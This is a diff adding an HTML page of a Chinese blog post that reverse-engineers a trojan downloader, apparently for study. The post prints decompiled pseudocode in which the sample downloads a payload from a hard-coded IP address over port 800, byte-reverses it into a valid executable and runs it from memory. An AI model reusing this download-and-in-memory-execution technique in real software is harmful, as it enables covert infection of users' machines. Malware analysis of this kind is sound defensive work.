@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x00 前言获得一个样本，简单了解为MFC的程序，以下是分析过程的一些总结，目的是为了了解这个程序到底做了什么。 第一次分析确实很乱，主要由于没有分析出程序的主功能，而且大部分的功能操作都是通过读取远程服务器的那个文件内容来操作。 0x01 流程分析AfxWinMain —&gt; initinstance —&gt; domodal —&gt; AfxDlgProc —&gt; OnInitD">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[reverse] 记一次木马分析">
+<meta property="og:url" content="http://example.com/2018/03/22/simple-virus-analysis/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="0x00 前言获得一个样本，简单了解为MFC的程序，以下是分析过程的一些总结，目的是为了了解这个程序到底做了什么。 第一次分析确实很乱，主要由于没有分析出程序的主功能，而且大部分的功能操作都是通过读取远程服务器的那个文件内容来操作。 0x01 流程分析AfxWinMain —&gt; initinstance —&gt; domodal —&gt; AfxDlgProc —&gt; OnInitD">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2018-03-21T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-03-17T05:58:50.133Z">
+<meta property="article:author" content="PENCH3R">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>[reverse] 记一次木马分析</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/category/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tag/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2018/03/23/struts2-045-vul-analysis/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2018/01/26/dedecms-download-vulnerability/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/03/22/simple-virus-analysis/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/03/22/simple-virus-analysis/&text=[reverse] 记一次木马分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/03/22/simple-virus-analysis/&title=[reverse] 记一次木马分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/03/22/simple-virus-analysis/&is_video=false&description=[reverse] 记一次木马分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=[reverse] 记一次木马分析&body=Check out this article: http://example.com/2018/03/22/simple-virus-analysis/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/03/22/simple-virus-analysis/&title=[reverse] 记一次木马分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/03/22/simple-virus-analysis/&title=[reverse] 记一次木马分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/03/22/simple-virus-analysis/&title=[reverse] 记一次木马分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/03/22/simple-virus-analysis/&title=[reverse] 记一次木马分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/03/22/simple-virus-analysis/&name=[reverse] 记一次木马分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/03/22/simple-virus-analysis/&t=[reverse] 记一次木马分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">0x01 流程分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">0x02 总结:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%94%B6%E8%8E%B7%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">0x03 收获：</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        [reverse] 记一次木马分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">PENCH3R</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-03-21T16:00:00.000Z" itemprop="datePublished">2018-03-22</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/ReverseEngineering/">ReverseEngineering</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>获得一个样本，简单了解为MFC的程序，以下是分析过程的一些总结，目的是为了了解这个程序到底做了什么。</p>
+<p>第一次分析确实很乱，主要由于没有分析出程序的主功能，而且大部分的功能操作都是通过读取远程服务器的那个文件内容来操作。</p>
+<h2 id="0x01-流程分析"><a href="#0x01-流程分析" class="headerlink" title="0x01 流程分析"></a>0x01 流程分析</h2><p>AfxWinMain —&gt; initinstance —&gt; domodal —&gt; AfxDlgProc —&gt; OnInitDialog —&gt; trojan_download</p>
+<p>trojan_download函数执行流程：</p>
+<p>伪代码：</p>
+<pre><code>trojan_download(CDialog *this) &#123;
+    typedef DWORD (CALLBACK *LPFNREGISTER)(DWORD,DWORD);
+    char *FileName = &quot;C:/Program Files/Internet Explorer&quot;;
+    char *LibFileName = &quot;/updata.exe&quot;;
+    strconcat(FileName, LibFileName);
+    if (GetFileAttributesA(&amp;FileName) == -1) &#123;
+        HMODULE hModule = LoadLibraryA(&quot;urlmon.dll&quot;);
+        LPFNREGISTER lpfnRegister = GetProcAddress(hModule, &quot;URLDownloadToFileA&quot;);
+        char *Trojan = &quot;http://121.14.212.211:800/updata.dat&quot;;
+        URLDownloadToFileA(0, Trojan, FileName, 0, 0);
+        sub_402320(FileName);
+    &#125; else &#123;
+        HANDLE hOpenfile = CreateFileA(lpFileName, 
+                        FILE_FLAG_WRITE_THROUGH,
+                        0,
+                        0,
+                        3u,
+                        0x80u,
+                        0);
+        result = sub_402260(hOpenfile, &quot;SSSSSSVID&quot;);
+        if ( result &amp;&amp; !strcmp(result+0xa, &quot;2018-V1&quot;))   // 文件头部偏移0xa是否为2018-V1
+            sub_402320(fOpenfile);        // 加载updata.exe
+    &#125;
+&#125;
+</code></pre>
+<p>sub_402320伪代码：</p>
+<pre><code>sub_402320(const char * filename) &#123;
+    char *lpFileName = filename;
+    while(1) &#123;
+        HANDLE hOpenfile = CreateFileA(lpFileName, 
+                        FILE_FLAG_WRITE_THROUGH,
+                        0,
+                        0,
+                        3u,
+                        0x80u,
+                        0);
+        DWORD dwFilesize = GetFileSize(hOpenfile, 0);
+        char *LibFileName = &quot;KERNEL.dll&quot;;
+        char *ProcName = &quot;VirtualAlloc&quot;;
+        HMODULE hModuleKernel = LoadLibraryA(LibFileName);
+        LPFNREGISTER lp = GetProcAddress(hModuleKernel, ProcName);
+        void *pMem = lp(0, dwFileSize, MEM_RESERVE|MEM_COMMIT, 4);
+        ReadFile( hOpenfile, pMem, dwFileSize, &amp;NumberOfBytesRead, 0);
+        CloseHandle(hOpenfile);
+        rever_file_content((char *)pMem, dwFilesize);  // 将头尾的数据进行一次替换
+        // heap_buff为一个20字节的数组，index0:updataPEbuff index1:updatabuff index2:0 index3:0 index4:0
+        // updata文件的偏移为*(PE+0x28)是一个函数指针，参数为updata, 1, 0;最后更新heap_buff[4]为1
+        // updatabuff中偏移为(PE+0x34)存放updatabuff地址
+        heap_buff = sub_401B90((int)pMem);
+        if (heap_buff) &#123;
+            char *string = &quot;updata&quot;;
+            result = sub_401DB0(heap_buff, string);
+            if (result) break;
+        &#125;
+    &#125;
+    result(&quot;aPi99pfwFrwvqd9&quot;);
+    sub_401870((int)heap_buff);   // 释放heap_buff,并执行updata中的函数指针
+&#125;
+</code></pre>
+<p>sub_401DB0的大致功能： </p>
+<p>首先判断updatabuff偏移为(PE+0x7c)是否非0， 在updatabuff偏移为*(PE+0x78)+0x18和*(PE+0x78)+0x14非0，最后返回的是updatabuff偏移为*(*(PE+0x78+0x1C)+4 * (*(PE+0x78+0x24))+updatabuffer),返回的这个这个值为一个函数指针。</p>
+<p>该函数指针会接受参数 aPi99pfwFrwvqd9 ,</p>
+<p>sub_401DB0伪代码：</p>
+<pre>int __cdecl sub_401DB0(int heap_buff, int updata)
+{
+  int _heap_buff; // eax@1
+  int updataimage1; // ebp@1
+  _DWORD *updata_PE_78_OFFSET; // edi@1
+  int result; // eax@2
+  int v6; // edi@3
+  _DWORD *v7; // ebx@5
+  _WORD *v8; // ebp@5
+  unsigned int v9; // ebx@8
+  int v10; // [sp+8h] [bp-8h]@5
+  int updataimage2; // [sp+14h] [bp+4h]@1
+
+  _heap_buff = heap_buff;
+  updataimage1 = *(_DWORD *)(heap_buff + 4);
+  updataimage2 = *(_DWORD *)(heap_buff + 4);
+  updata_PE_78_OFFSET = (_DWORD *)(*(_DWORD *)_heap_buff + 0x78);
+  if ( *(_DWORD *)(*(_DWORD *)_heap_buff + 0x7C) )
+  {
+    v6 = updataimage1 + *updata_PE_78_OFFSET;
+    if ( *(_DWORD *)(v6 + 0x18) && *(_DWORD *)(v6 + 0x14) )
+    {
+      Sleep(0);
+      Sleep(0);
+      v7 = (_DWORD *)(updataimage1 + *(_DWORD *)(v6 + 0x20));
+      v8 = (_WORD *)(updataimage2 + *(_DWORD *)(v6 + 0x24));
+      v10 = 0;
+      if ( *(_DWORD *)(v6 + 0x18) )
+      {
+        while ( sub_401110(updata, (_BYTE *)(updataimage2 + *v7)) )
+        {
+          ++v7;
+          ++v8;
+          if ( (unsigned int)++v10 >= *(_DWORD *)(v6 + 24) )
+            goto LABEL_8;
+        }
+        v9 = *v8;
+      }
+      else
+      {
+LABEL_8:
+        v9 = -1;
+      }
+      if ( v9 != -1 && v9 <= *(_DWORD *)(v6 + 20) )
+      {
+        Sleep(0);
+        Sleep(0);
+        result = updataimage2 + *(_DWORD *)(*(_DWORD *)(v6 + 0x1C) + 4 * v9 + updataimage2);
+      }
+      else
+      {
+        result = 0;
+      }
+    }
+    else
+    {
+      result = 0;
+    }
+  }
+  else
+  {
+    result = 0;
+  }
+  return result;
+}</pre>
+
+<p><code>sub_401870</code>的大致功能：</p>
+<p>主要是回收之前分配的<code>heap_buff</code>,并在收回之前会重新执行<code>updata</code>文件的偏移为<code>*(PE+0x28)</code>是一个函数指针。</p>
+<p><code>sub_402260</code>函数的功能：</p>
+<p>通过<code>readfile</code>将<code>updata.exe</code>的内容写入到内存中，并且通过<code>normalPEfile_402170</code>整理传入到内存中的数据(由于头尾数据已经被相互替换)。再通过<code>sub_4021D0</code>(判断文件开头是否有<code>SSSSSSVID</code>，有的话返回跳过的值，无的话返回0)，通过<code>qmemcpy</code>将<code>updata.exe</code>的文件的头<code>0x32</code>个字节写入到内存地址<code>42c764</code>.最后返回<code>42c764</code>。</p>
+<p><code>sub_402260</code>伪代码：</p>
+<pre>void *__cdecl sub_402260(HANDLE hFile, int a2)
+{
+  void *result; // eax@1
+  int v3; // esi@1
+  void *v4; // ebx@2
+  signed int v5; // esi@2
+  DWORD NumberOfBytesRead; // [sp+8h] [bp-4h]@1
+
+  NumberOfBytesRead = 0;
+  result = (void *)GetFileSize(hFile, 0);
+  v3 = (int)result;
+  if ( result ) {
+    v4 = operator new[]((unsigned int)result);
+    ReadFile(hFile, v4, v3, &NumberOfBytesRead, 0);
+    normalPEfile_402170((char *)v4, v3);
+    v5 = sub_4021D0((int)v4, (const char *)a2, v3, 0);
+    if ( v5 == -1 ) {
+          operator delete(v4);
+          result = 0;
+    }
+    else {
+          qmemcpy(&unk_42C764, (char *)v4 + v5, 0x32u);
+          operator delete(v4);
+          result = &unk_42C764;
+    }
+  }
+  return result;
+}</pre>
+
+<p>normalPEfile_402170伪代码：</p>
+<pre>void normalPEfile_402170(char *file, int filesize)
+{
+  char *lpfile = file;
+  char *lpfile_tail = &file[filesize - 1];
+  if ( file != lpfile_tail )
+  {
+    do
+    {
+      char ch = *lpfile;
+      *lpfile = *lpfile_tail;
+      *lpfile_tail = ch;
+      ++lpfile;
+      if ( lpfile == lpfile_tail )
+        break;
+      --lpfile_tail;
+    }
+    while ( lpfile != lpfile_tail );
+  }
+}</pre>
+
+<p>ps: 由于篇幅的原因故很多代码都省略了. </p>
+<p>第一次分析可能有些乱，而且这个样本很多操作都是直接通过对PE文件的头部进行操作，包括存地址，存标记，读取偏移量再基于偏移量进行地址读取等等，分析起来确实费力，最终还由于远程服务器已经没有<code>updata.dat</code>所以分析也不完整，不知道这个程序的后续是否还有其他操作</p>
+<h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结:"></a>0x02 总结:</h2><p>在<code>oninitdialog</code>中运行的主要功能是初始化,从C&amp;C服务上下载<code>updata.data</code>保存到本地的<code>C:/Program Files/Internet explore/updata.exe</code>，将该文件的内容写入到分配的内存空间中，经过算法处理后，运行<code>sub_401DB0</code>返回的函数指针，参数为<code>aPi99pfwFrwvqd9</code>. 最后清理申请的所有内存。</p>
+<p>中间有2个细节感觉很有意思：</p>
+<p>第一. 远程下载到本地的文件，并不是一个有效的PE程序(通过在内存中使用<code>normalPEfile_402170</code>程序恢复成有效的PE文件)</p>
+<p>第二. 文件内容的所有处理过程都是通过新申请内存来操作，包括最后的执行也是在进程空间中，最后退出时撤销所有申请的内存</p>
+<p>目前无法确认后续是否还有其他操作，看virustotal上的分析应该还有文件的增加/删除的操作，但由于服务器上的文件已经删除，导致程序在动态调试时造成异常无法进行后续分析。</p>
+<h2 id="0x03-收获："><a href="#0x03-收获：" class="headerlink" title="0x03 收获："></a>0x03 收获：</h2><p>重新熟悉了od,ida等工具的使用以及汇编代码,了解了MFC的一些基本的运行流程,但是对于消息响应的机制没有深入研究，因为该木马只有在初始化的时候进行了功能执行。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/category/">Category</a></li>
+         
+          <li><a href="/tag/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">0x01 流程分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">0x02 总结:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%94%B6%E8%8E%B7%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">0x03 收获：</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/03/22/simple-virus-analysis/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/03/22/simple-virus-analysis/&text=[reverse] 记一次木马分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/03/22/simple-virus-analysis/&title=[reverse] 记一次木马分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/03/22/simple-virus-analysis/&is_video=false&description=[reverse] 记一次木马分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=[reverse] 记一次木马分析&body=Check out this article: http://example.com/2018/03/22/simple-virus-analysis/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/03/22/simple-virus-analysis/&title=[reverse] 记一次木马分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/03/22/simple-virus-analysis/&title=[reverse] 记一次木马分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/03/22/simple-virus-analysis/&title=[reverse] 记一次木马分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/03/22/simple-virus-analysis/&title=[reverse] 记一次木马分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/03/22/simple-virus-analysis/&name=[reverse] 记一次木马分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/03/22/simple-virus-analysis/&t=[reverse] 记一次木马分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2017-2022
+    PENCH3R
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/category/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tag/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+  <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js" crossorigin="anonymous"></script>
+  
+<script src="/js/wrapImage.js"></script>
+
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
